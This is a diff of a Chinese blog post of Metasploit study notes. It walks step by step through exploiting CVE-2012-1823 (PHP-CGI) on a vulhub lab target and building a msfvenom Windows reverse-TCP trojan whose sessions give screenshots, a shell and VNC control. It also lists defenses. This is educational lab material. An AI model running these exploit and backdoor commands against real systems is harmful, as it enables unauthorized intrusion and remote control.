-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img36.png"></p>
-<ol start="8">
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752529409-ac067c77-1164-43a4-98d3-d98552d9b787.png"></p>
+<ol start="6">
 <li>执行攻击</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<ol start="9">
+<ol start="7">
 <li>启动命令行</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img37.png"></p>
-<h3 id="4-防御-2"><a href="#4-防御-2" class="headerlink" title="4. 防御"></a>4. 防御</h3><ul>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752926788-547bc844-871c-486c-b6ec-86dfe100dcb6.png"></p>
+<h3 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h3><ul>
 <li>升级Samba版本</li>
 <li>禁用nt pipe</li>
 <li>共享目录设只读</li>
 <li>防火墙限制445端口。</li>
 </ul>
-<h2 id="四-CVE-2012-1823（PHP-CGI漏洞利用）"><a href="#四-CVE-2012-1823（PHP-CGI漏洞利用）" class="headerlink" title="(四) CVE-2012-1823（PHP CGI漏洞利用）"></a>(四) CVE-2012-1823（PHP CGI漏洞利用）</h2><h3 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>CVE-2012-1823 是 PHP-CGI 模式 下的高危远程代码执行漏洞，影响 PHP &lt; 5.3.12 和 PHP &lt; 5.4.2 版本。当 PHP 以 CGI 模式运行时，QUERY_STRING 中的参数会被直接当作 php-cgi 命令行参数 解析，从而允许攻击者传入 -s、-d、-c 等开关，实现<strong>源码泄露</strong>或<strong>任意代码</strong>执行。<br>漏洞成因 根据 RFC3875 规范，当 QUERY_STRING 中不包含 &#x3D; 时，Web 服务器会将其作为命令行参数传递给 CGI 程序。PHP 在 CGI SAPI 中未正确过滤这些参数，导致攻击者可构造恶意 URL 直接传递命令行选项。</p>
-<h3 id="2-命令行汇总-3"><a href="#2-命令行汇总-3" class="headerlink" title="2. 命令行汇总"></a>2. 命令行汇总</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 启动MSF控制台</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 搜索漏洞模块 </span></span><br><span class="line">search CVE-2012-1823</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载PHP-CGI参数注入EXP模块</span></span><br><span class="line">use exploit/multi/http/php_cgi_arg_injection</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标IP（Ubuntu靶机地址）</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标端口</span></span><br><span class="line"><span class="built_in">set</span> RPORT 8080</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行漏洞攻击</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 成功获取会话后，调取目标系统原生命令行</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前系统权限</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+<h2 id="CVE-2012-1823（PHP-CGI漏洞利用）"><a href="#CVE-2012-1823（PHP-CGI漏洞利用）" class="headerlink" title="CVE-2012-1823（PHP CGI漏洞利用）"></a>CVE-2012-1823（PHP CGI漏洞利用）</h2><h3 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h3><p>CVE-2012-1823 是 PHP-CGI 模式 下的高危远程代码执行漏洞，影响 PHP &lt; 5.3.12 和 PHP &lt; 5.4.2 版本。当 PHP 以 CGI 模式运行时，QUERY_STRING 中的参数会被直接当作 php-cgi 命令行参数 解析，从而允许攻击者传入 -s、-d、-c 等开关，实现<strong>源码泄露</strong>或<strong>任意代码</strong>执行。<br>漏洞成因 根据 RFC3875 规范，当 QUERY_STRING 中不包含 &#x3D; 时，Web 服务器会将其作为命令行参数传递给 CGI 程序。PHP 在 CGI SAPI 中未正确过滤这些参数，导致攻击者可构造恶意 URL 直接传递命令行选项。</p>
+<h3 id="命令行汇总-3"><a href="#命令行汇总-3" class="headerlink" title="命令行汇总"></a>命令行汇总</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动MSF控制台</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 搜索漏洞模块 </span></span><br><span class="line">search CVE-2012-1823</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载PHP-CGI参数注入EXP模块</span></span><br><span class="line">use exploit/multi/http/php_cgi_arg_injection</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标IP（Ubuntu靶机地址）</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标端口</span></span><br><span class="line"><span class="built_in">set</span> RPORT 8080</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行漏洞攻击</span></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"><span class="comment"># 成功获取会话后，调取目标系统原生命令行</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前系统权限</span></span><br><span class="line"><span class="built_in">id</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="3-攻击步骤-3"><a href="#3-攻击步骤-3" class="headerlink" title="3. 攻击步骤"></a>3. 攻击步骤</h3><ul>
-<li><strong>环境搭建：</strong> 靶机vulhub</li>
+<h3 id="攻击步骤-3"><a href="#攻击步骤-3" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><ul>
+<li>**环境搭建： <strong>靶机vulhub</strong> **</li>
 </ul>
 <ol>
 <li>启动靶场</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止旧容器</span></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换root管理员权限</span></span><br><span class="line">su root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换至漏洞目录</span></span><br><span class="line"><span class="built_in">cd</span> /home/enjoy/vulhub-master/php/CVE-2012-1823</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建镜像（首次启动环境执行）</span></span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后台启动靶场容器</span></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 校验docker-compose配置是否正常（可选命令）</span></span><br><span class="line">docker-compose config</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img48.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783926151755-fa36c0ef-6438-4b90-9b59-b905bee2741e.png"></p>
 <ol start="2">
 <li>启动 MSF</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -q</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img32.png"></p>
-<ol start="3">
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783752155201-aec420ca-4183-4b4f-ae02-28261fe811fb.png"></p>
+<ol start="2">
 <li>搜索漏洞模块</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2012-1823</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img49.png"></p>
-<ol start="4">
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783926437850-29aa71ba-8bc5-4dec-b2d8-74f248dc49db.png"></p>
+<ol start="3">
 <li>加载漏洞攻击模块</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img50.png"></p>
-<ol start="5">
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783926467556-ecad250a-7bd1-4676-8579-a2db9b5e1fc2.png"></p>
+<ol start="4">
 <li>查看当前模块需要配置的参数</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img51.png"></p>
-<ol start="6">
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783927059110-0f5b4ed4-a910-4be3-917c-4c0f63157438.png"></p>
+<ol start="5">
 <li>设置远程受害主机IP 和 端口</li>
 </ol>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img52.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783926716659-60c24ea3-91aa-447d-840c-a79b6eaa2ab1.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOSTS 192.168.23.135</span><br><span class="line"><span class="built_in">set</span> RPORT 8080</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img53.png"></p>
-<ol start="7">
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783926811086-015066ea-2208-425c-a89a-d21a5668d323.png"></p>
+<ol start="6">
 <li>执行攻击</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img54.png"></p>
-<ol start="8">
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783927262636-51a44e10-afbc-4f6a-8794-a7f260371aa6.png"></p>
+<ol start="7">
 <li>启动命令行</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">id</span>		<span class="comment">#查看当前执行权限</span></span><br><span class="line">ip addr</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img55.png"></p>
-<h3 id="4-防御-3"><a href="#4-防御-3" class="headerlink" title="4. 防御"></a>4. 防御</h3><ul>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783927620687-810609d7-a0ea-416d-9589-0ecb7ca867c8.png"></p>
+<h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><ul>
 <li>升级 PHP 到 5.3.12、5.4.2 及以上安全版本；</li>
 <li>废弃 PHP-CGI 模式，改用 PHP-FPM；</li>
 <li>在 Apache&#x2F;Nginx 配置规则，拦截-d、-s等危险 URL 参数；</li>
 <li>使用低权限账号运行 PHP 程序；</li>
 <li>监控日志与进程行为，及时发现漏洞攻击尝试。</li>
 </ul>
-<h2 id="五-msfvenom-生成后门木马"><a href="#五-msfvenom-生成后门木马" class="headerlink" title="(五) msfvenom 生成后门木马"></a>(五) msfvenom 生成后门木马</h2><h3 id="1-Msfvenom-是什么？"><a href="#1-Msfvenom-是什么？" class="headerlink" title="1. Msfvenom 是什么？"></a>1. Msfvenom 是什么？</h3><p>Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。</p>
-<h3 id="2-使用场景"><a href="#2-使用场景" class="headerlink" title="2. 使用场景"></a>2. 使用场景</h3><p>Msfvenom常用于<strong>红队渗透测试</strong>和<strong>社会工程学攻击</strong>中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动</p>
-<h3 id="3-核心参数"><a href="#3-核心参数" class="headerlink" title="3. 核心参数"></a>3. 核心参数</h3><ol>
-<li><code>-p</code> 指定使用的攻击 payload（后门类型），例如 <code>windows/meterpreter/reverse_tcp</code></li>
-<li><code>LHOST</code> Local Host，攻击机（Kali）IP，受害机主动反弹连接这个地址</li>
-<li><code>LPORT</code> 攻击机开启监听的端口</li>
-<li><code>-f</code> 文件输出格式（elf、exe、so、raw 等）</li>
-<li><code>-o</code> 保存生成的后门文件（output）</li>
+<h2 id="msfvenom-生成后门木马"><a href="#msfvenom-生成后门木马" class="headerlink" title="msfvenom 生成后门木马"></a>msfvenom 生成后门木马</h2><h3 id="Msfvenom-是什么？"><a href="#Msfvenom-是什么？" class="headerlink" title="Msfvenom 是什么？"></a>Msfvenom 是什么？</h3><p>Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。</p>
+<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p>Msfvenom常用于<strong>红队渗透测试</strong>和<strong>社会工程学攻击</strong>中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动</p>
+<h3 id="核心参数"><a href="#核心参数" class="headerlink" title="核心参数"></a>核心参数</h3><ol>
+<li>-p 指定使用的攻击 payload（后门类型），例如<code>windows/meterpreter/reverse_tcp</code></li>
+<li>LHOSTLocal Host，攻击机（Kali）IP，受害机主动反弹连接这个地址</li>
+<li>LPORT 攻击机开启监听的端口</li>
+<li>-f 文件输出格式（elf、exe、so、raw 等）</li>
+<li>-o 保存生成的后门文件（output）</li>
 </ol>
-<h3 id="4-基础语法"><a href="#4-基础语法" class="headerlink" title="4. 基础语法"></a>4. 基础语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p 载荷 LHOST=攻击机IP LPORT=监听端口 -f 格式 -o 输出文件</span><br></pre></td></tr></table></figure>
+<h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p 载荷 LHOST=攻击机IP LPORT=监听端口 -f 格式 -o 输出文件</span><br></pre></td></tr></table></figure>
 
-<h3 id="5-Windows木马示例"><a href="#5-Windows木马示例" class="headerlink" title="5. Windows木马示例"></a>5. Windows木马示例</h3><ol>
+<h3 id="Windows木马示例"><a href="#Windows木马示例" class="headerlink" title="Windows木马示例"></a>Windows木马示例</h3><ol>
 <li>查看攻击机的 IP 192.168.23.131</li>
 </ol>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img38.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783754748966-6817a6fb-0e6f-46b7-a215-eb3a95c72e16.png"></p>
 <ol start="2">
 <li>msfvenom 生成Windows反弹木马</li>
 </ol>
@@ -723,8 +795,10 @@
 <li><code>-f exe</code>：输出格式为Windows可执行程序</li>
 <li><code>&gt; hello.exe</code>：将内容输出保存为hello.exe（等价 <code>-o hello.exe</code>）</li>
 </ul>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img39.png"></p>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img40.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783754860227-b7b82866-ca3f-479d-bdbe-543656da17c4.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783754951456-97075684-ae39-45c0-b7ca-93fc8c15a0f1.png"></p>
 <ol start="3">
 <li>监听</li>
 </ol>
@@ -738,36 +812,43 @@
 <li><code>set LPORT 9999</code>：监听端口，必须和木马端口保持统一</li>
 <li><code>exploit -j</code>：<code>-j</code> &#x3D; job后台运行监听，不会占用当前窗口</li>
 </ul>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img41.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783755515865-5f972362-95b7-48a4-b387-8c716bb55047.png"></p>
 <ol start="4">
 <li>把木马放到靶机并运行hello.exe，成功得到meterpreter &gt; 后执行</li>
 </ol>
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img42.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783756295981-6faab4ba-417a-45c4-93d2-4e85b689ae93.png"></p>
 <ol start="5">
 <li>查看后台任务与对话</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img43.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783756394425-75b10839-a585-45fb-99e2-a03600abed69.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>
 
+<!-- 这是一张图片，ocr 内容为： -->
 <p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783756492637-9e1b9422-44c1-4f64-8161-eb91f065d4e5.png"></p>
 <ol start="6">
 <li>实现远程控制</li>
 </ol>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot      <span class="comment"># 对受害主机屏幕截图</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img45.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783757306533-da686ce9-9420-4215-b901-5ff7432e6d59.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell           <span class="comment"># 调出目标原生cmd命令行</span></span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img46.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783756667250-cdc947dd-3714-4ac4-87e5-5eb53cbb1228.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run vnc         <span class="comment"># 开启VNC远程桌面控制</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/img/posts/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/img47.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/65327698/1783757219750-ec3aac1b-4599-45bc-8dd0-c93b013416aa.png"></p>
 <blockquote>
 <p>本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。</p>
 </blockquote>
-</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/MSF/">MSF</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post-share"><div class="social-share" data-image="/img/photo.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/06/30/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%B8%8E%E5%91%BD%E4%BB%A4%E7%88%86%E7%A0%B4/index/" title="弱口令与命令爆破"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">弱口令与命令爆破</div></div><div class="info-2"><div class="info-item-1">弱口令定义与危害、密码字典生成（通用模式+社工定制）、Burp Suite四种爆破模式详解、Hydra多协议破解实战（SSH/RDP/MySQL/HTTP表单）</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index/" title="SQL注入漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-23</div><div class="info-item-2">SQL注入漏洞</div></div><div class="info-2"><div class="info-item-1">SQL注入漏洞的原理、分类（联合/报错/布尔/时间盲注）、常见绕过技巧与防御方法</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jasmine_Iris</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Jasmineee007"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Jasmineee007" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客~ 📝<br/><hr/>最近更新：2026-07-11<br/><br/>最新文章：<br/><a href="/2026/07/11/MSF%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index/">MSF的使用以及漏洞复现</a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81MSF-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">一、MSF 是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0"><span class="toc-text">(一) 基础概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E6%A0%B8%E5%BF%83%E7%9B%AE%E5%BD%95%E5%88%86%E5%B7%A5"><span class="toc-text">(二) 核心目录分工</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-modules%E5%85%AD%E5%A4%A7%E5%AD%90%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-text">(三) modules六大子模块详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Auxiliary-%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97"><span class="toc-text">1. Auxiliary 辅助模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Exploits-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A8%A1%E5%9D%97%EF%BC%88EXP%EF%BC%89"><span class="toc-text">2. Exploits 漏洞利用模块（EXP）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Payloads-%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%EF%BC%88Shellcode%EF%BC%89"><span class="toc-text">3. Payloads 攻击载荷（Shellcode）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Encoders-%E7%BC%96%E7%A0%81%E5%99%A8%EF%BC%88%E5%85%8D%E6%9D%80%E7%BC%96%E7%A0%81%EF%BC%89"><span class="toc-text">4. Encoders 